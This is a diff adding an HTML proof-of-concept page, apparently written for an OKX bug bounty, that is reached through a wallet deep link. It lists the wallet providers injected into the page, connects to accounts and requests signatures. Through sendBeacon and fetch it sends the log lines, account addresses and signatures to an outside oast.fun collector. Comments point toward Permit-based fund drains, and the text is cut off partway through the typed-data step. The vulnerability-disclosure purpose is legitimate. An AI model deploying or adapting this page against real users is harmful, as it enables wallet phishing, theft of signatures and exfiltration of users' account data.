@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>OKX bug bounty PoC — DApp WebView injection</title>
+  <style>
+    body{font:14px/1.4 -apple-system,system-ui,monospace;margin:0;padding:16px;background:#0b0b0c;color:#e8e8e8}
+    h1{font-size:16px;margin:0 0 8px}
+    button{display:block;width:100%;padding:14px;margin:8px 0;font-size:15px;
+           background:#3573ff;border:0;color:#fff;border-radius:8px}
+    pre{background:#111;padding:12px;border-radius:8px;overflow:auto;font-size:12px;max-height:60vh}
+    .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}.crit{color:#f43f5e;font-weight:bold}
+  </style>
+</head>
+<body>
+
+<h1>OKX DApp WebView — Wallet Injection PoC</h1>
+<p>Reachable via <code>okx://wallet/dapp/details?dappUrl=https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/drain.html</code></p>
+
+<button id="probe">1. Enumerate injected wallet providers</button>
+<button id="connect">2. Connect wallet (eth_requestAccounts)</button>
+<button id="sign">3. Sign benign PoC message (personal_sign)</button>
+<button id="typed">4. Sign typed data (eth_signTypedData_v4)</button>
+<button id="multichain">5. Probe Solana / Aptos / Sui / Bitcoin / Tron / Starknet</button>
+
+<pre id="log"></pre>
+
+<script>
+// ------------- collector -------------
+// Change this to your own logging endpoint. Beacons run regardless of WebView lifecycle.
+const COLLECT = 'https://xdhrflssxhuownkbsbgks7myap3kv1oo6.oast.fun/collect';
+
+const logEl = document.getElementById('log');
+function log(line, cls){
+  const t = new Date().toISOString().slice(11,23);
+  const span = document.createElement('span');
+  if(cls) span.className = cls;
+  span.textContent = `[${t}] ${line}\n`;
+  logEl.appendChild(span);
+  // exfil so PoC evidence survives WebView closure
+  try { navigator.sendBeacon(COLLECT + '?ev=' + encodeURIComponent(line)); } catch(e){}
+}
+
+// ------------- 1. Provider enumeration -------------
+const EVM_PROVIDERS = ['ethereum','okxwallet','okexchain','web3','coinbaseWalletExtension'];
+const NON_EVM       = ['solana','okxSolana','aptos','okxAptos','sui','okxSui',
+                       'bitcoin','okxBitcoin','tronWeb','okxTron','starknet','okxStarknet',
+                       'cosmos','okxCosmos','ton','okxTon'];
+const ALL = [...EVM_PROVIDERS, ...NON_EVM];
+
+document.getElementById('probe').onclick = () => {
+  log('[+] origin = ' + location.origin);
+  log('[+] UA     = ' + navigator.userAgent);
+  let found = 0;
+  ALL.forEach(name => {
+    if (window[name]) {
+      found++;
+      let methods = '';
+      try { methods = Object.keys(window[name]).slice(0,12).join(','); } catch(e){}
+      log(`[!] PROVIDER INJECTED: window.${name}  methods=${methods}`, 'crit');
+    }
+  });
+  if (window.webkit?.messageHandlers) {
+    log('[!] iOS WKWebView handlers: ' + Object.keys(window.webkit.messageHandlers).join(','), 'crit');
+  }
+  if (!found) log('[-] no EIP-1193 / wallet providers detected on window', 'warn');
+};
+
+// ------------- 2. Connect (eth_requestAccounts) -------------
+let accounts = [];
+document.getElementById('connect').onclick = async () => {
+  const p = window.ethereum || window.okxwallet;
+  if (!p) return log('[-] no EVM provider', 'err');
+  try {
+    accounts = await p.request({ method: 'eth_requestAccounts' });
+    const chainId = await p.request({ method: 'eth_chainId' });
+    log('[+] accounts = ' + JSON.stringify(accounts), 'ok');
+    log('[+] chainId  = ' + chainId, 'ok');
+  } catch(e){ log('[err] ' + e.message, 'err'); }
+};
+
+// ------------- 3. personal_sign (BENIGN MARKER — proof of remote signing) -------------
+document.getElementById('sign').onclick = async () => {
+  const p = window.ethereum || window.okxwallet;
+  if (!p || !accounts.length) return log('[-] connect first', 'err');
+
+  // The signed message is the irrefutable PoC artifact: it includes a fresh
+  // timestamp and the attacker origin, so it cannot have been signed earlier
+  // by the user themselves on a legitimate page.
+  const marker =
+`OKX Bug Bounty PoC — DApp WebView Injection
+Researcher: <YOUR HANDLE>
+Origin: ${location.origin}
+Timestamp: ${new Date().toISOString()}
+Random: ${crypto.randomUUID()}
+Account: ${accounts[0]}
+
+This message was requested by an attacker-controlled page loaded via
+"okx://wallet/dapp/details?dappUrl=<attacker URL>" through DappDeepLinkTools.lua
+→ OKDAppBridge:openDAppBrowserWithDic. A signature here proves remote
+wallet-control. NOT a transaction — funds are not moved.`;
+
+  try {
+    const sig = await p.request({ method: 'personal_sign', params: [marker, accounts[0]] });
+    log('[!!] PoC SIGNATURE RECEIVED', 'crit');
+    log('[!!] message = ' + marker.replace(/\n/g,'\\n'), 'crit');
+    log('[!!] signature = ' + sig, 'crit');
+    // POST so OKX can verify offline using ecrecover
+    fetch(COLLECT + '/sig', {method:'POST', headers:{'content-type':'application/json'},
+      body: JSON.stringify({account: accounts[0], message: marker, signature: sig})});
+  } catch(e){ log('[err] ' + e.message, 'err'); }
+};
+
+// ------------- 4. eth_signTypedData_v4 (EIP-712 — what a real attack would use) -------------
+// Note: real drains use this with EIP-2612 Permit / Permit2 / Seaport typed data.
+/
